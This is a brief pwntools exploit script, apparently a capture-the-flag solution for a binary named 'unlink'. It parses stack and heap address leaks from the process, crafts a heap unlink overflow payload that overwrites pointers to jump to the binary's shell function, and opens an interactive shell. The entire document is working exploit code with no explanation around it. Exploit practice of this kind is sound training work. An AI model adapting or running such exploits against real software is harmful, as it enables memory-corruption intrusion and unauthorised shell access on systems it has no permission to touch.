from pwn import *

p = process('./unlink')
e = ELF('./unlink')

shell_addr = e.symbols['shell']

# Get leaks
p.recvuntil('here is stack address leak: ')
stack_leak_addr = p.recv(10)
p.recvuntil('here is heap address leak: ')
heap_leak_addr = p.recv(9)

print stack_leak_addr, heap_leak_addr
stack_leak_addr = int(stack_leak_addr, 16)
heap_leak_addr = int(heap_leak_addr, 16)
ecx_mov_addr = stack_leak_addr + 0x10
# 0xffffd134 0x804b410 0xffffd144
p.recvuntil('now that you have leaks, get shell!\n')

print pidof(p)
raw_input()

# exp
x  = p32(shell_addr)
x += 'A' * (16 - len(x))
x += p32(heap_leak_addr + 12)
x += p32(ecx_mov_addr)
print len(x)
p.sendline(x)

p.interactive()
